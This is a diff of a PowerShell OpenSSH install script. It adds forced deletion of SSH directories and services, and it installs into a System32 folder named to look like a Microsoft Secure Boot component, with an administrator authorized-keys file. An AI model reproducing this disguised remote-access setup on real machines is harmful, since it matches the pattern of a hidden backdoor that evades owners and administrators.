@@ -6,6 +6,8 @@ $programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
 $destinationPath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
 $packagename = "OpenSSH"
 $VerboseOutput = $ture
+$sshdirtorm = @("C:\ProgramData\ssh", "C:\Program Files\OpenSSH")
+$serviceNames = @("sshd", "ssh-agent")
 $sshdatadirectory = "C:\ProgramData\ssh"
 $sshdconfigdestinationpath = "$sshdatadirectory\sshd_config"
 $authorizedkeyfiledestinationpath = "$sshdatadirectory\administrators_authorized_keys"
@@ -50,20 +52,21 @@ function Download-File {
     }
 }
 #Cleanup before new-install.
-$allRules = Get-NetFirewallRule
-foreach ($ruleName in $rules) {
-    $matchedRules = $allRules | Where-Object { $_.Name -like $ruleName }
-    foreach ($rule in $matchedRules) {
-        Remove-NetFirewallRule -Name $rule.Name
-        Write-VerboseMessage "Removed firewall rule: $($rule.Name)"
-    }
-}
 Install-PackageProvider -Name NuGet -Force | Out-Null
 Uninstall-Package $packagename -Force -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
-if (Test-Path $sshdatadirectory) {
-Remove-Item -Path $sshdatadirectory -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
+foreach ($directory in $sshdirtorm) {
+    if (Test-Path $directory) {
+        Remove-Item -Path $directory -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
+	}}
+foreach ($serviceName in $serviceNames) {
+    if (Get-Service -Name $serviceName -ErrorAction SilentlyContinue) {
+        # Stop the service if it's running
+        if (Get-Service -Name $serviceName | Where-Object { $_.Status -eq 'Running' }) {
+            Stop-Service -Name $serviceName -Force | Out-Null
+        }
+        sc.exe delete $serviceName | Out-Null
+    }
 }
-else {}
 #installation of ssh
 if (-not (Test-Path (Split-Path $destinationPath))) {
     New-Item -Path (Split-Path $destinationPath) -ItemType Directory -Force | Out-Null
